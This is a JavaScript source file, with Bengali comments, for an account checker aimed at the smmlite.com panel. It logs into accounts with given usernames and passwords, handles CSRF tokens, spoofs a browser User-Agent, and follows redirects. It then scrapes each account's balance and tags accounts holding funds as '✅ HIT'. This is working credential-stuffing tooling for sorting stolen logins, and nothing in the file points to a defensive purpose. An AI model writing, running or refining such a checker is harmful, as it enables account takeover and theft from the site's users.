// lib/checkCore.js – SMMLite checker
async function fetchWithRetry(url, options = {}, retries = 2) {
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(url, options);
      return res;
    } catch (e) {
      if (i === retries - 1) throw e;
      await new Promise(r => setTimeout(r, 500));
    }
  }
}

function extractCsrf(html) {
  const match = html.match(/<input[^>]*name="_csrf"[^>]*value="([^"]+)"/);
  return match ? match[1] : null;
}

function extractBalance(html) {
  // প্রথমে ক্লাস "money" বা "balance" বা "navbar-money" খুঁজি
  const classRegex = /<[^>]*class="[^"]*(?:money|balance|navbar-money)[^"]*"[^>]*>([^<]*)<\/[^>]*>/g;
  let match;
  while ((match = classRegex.exec(html)) !== null) {
    const text = match[1].trim();
    const numMatch = text.match(/(\d+(?:[.,]\d+)?)/);
    if (numMatch) {
      const num = parseFloat(numMatch[1].replace(',', '.'));
      if (!isNaN(num)) return num;
    }
  }
  // পেজ টেক্সটে $ বা € বা ₺ খুঁজি
  const text = html.replace(/<[^>]*>/g, ' ');
  const globalMatch = text.match(/[\$\€\₺]\s*(\d+(?:[.,]\d+)?)/);
  if (globalMatch) {
    const num = parseFloat(globalMatch[1].replace(',', '.'));
    if (!isNaN(num)) return num;
  }
  return 0;
}

export async function checkAccount(username, password) {
  const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
  const headers = {
    'User-Agent': userAgent,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Referer': 'https://smmlite.com/'
  };

  try {
    // 1. হোমপেজ থেকে CSRF টোকেন নেওয়া
    const homeRes = await fetchWithRetry('https://smmlite.com/', {
      method: 'GET',
      headers
    });
    const homeHtml = await homeRes.text();
    const csrf = extractCsrf(homeHtml);
    if (!csrf) {
      return { valid: false, hit: false, balance: 0, message: 'CSRF token missing' };
    }

    // 2. লগইন রিকোয়েস্ট
    const formData = new URLSearchParams();
    formData.append('LoginForm[username]', username);
    formData.append('LoginForm[password]', password);
    formData.append('LoginForm[remember]', '1');
    formData.append('_csrf', csrf);

    const loginRes = await fetchWithRetry('https://smmlite.com/', {
      method: 'POST',
      headers: {
        ...headers,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://smmlite.com/'
      },
      body: formData.toString(),
      redirect: 'manual' // রিডাইরেক্ট ম্যানুয়ালি হ্যান্ডেল করব
    });

    // রিডাইরেক্ট ফলো করা (যদি ৩০২/৩০১)
    let finalHtml;
    let finalUrl = loginRes.url || 'https://smmlite.com/';
    if (loginRes.status >= 300 && loginRes.status < 400) {
      const location = loginRes.headers.get('location');
      if (location) {
        const redirectUrl = location.startsWith('http') ? location : `https://smmlite.com${location}`;
        const followRes = await fetchWithRetry(redirectUrl, {
          method: 'GET',
          headers
        });
        finalHtml = await followRes.text();
        finalUrl = followRes.url;
      } else {
        // লোকেশন না থাকলে রেসপন্স বডি থেকে বের করি
        const body = await loginRes.text();
        const match = body.match(/<a href="([^"]+)"/);
        if (match) {
          const redirectUrl = match[1].startsWith('http') ? match[1] : `https://smmlite.com${match[1]}`;
          const followRes = await fetchWithRetry(redirectUrl, {
            method: 'GET',
            headers
          });
          finalHtml = await followRes.text();
          finalUrl = followRes.url;
        } else {
          finalHtml = body;
        }
      }
    } else {
      finalHtml = await loginRes.text();
    }

    // লগইন সফল কিনা চেক
    const isLoggedIn = finalHtml.toLowerCase().includes('logout') || finalUrl.includes('dashboard');
    if (!isLoggedIn) {
      return { valid: false, hit: false, balance: 0, message: 'Invalid credentials' };
    }

    // ব্যালেন্স এক্সট্র্যাক্ট
    const balance = extractBalance(finalHtml);
    const isHit = balance >= 0.003;

    return {
      valid: true,
      hit: isHit,
      balance: balance,
      message: isHit ? '✅ HIT' : (balance > 0 ? '🆓 FREE (balance < $0.003)' : '🆓 FREE ($0)')
    };

  } catch (err) {
    return {
      valid: false,
      hit: false,
      balance: 0,
      message: `Request error: ${err.message}`
    };
  }
}
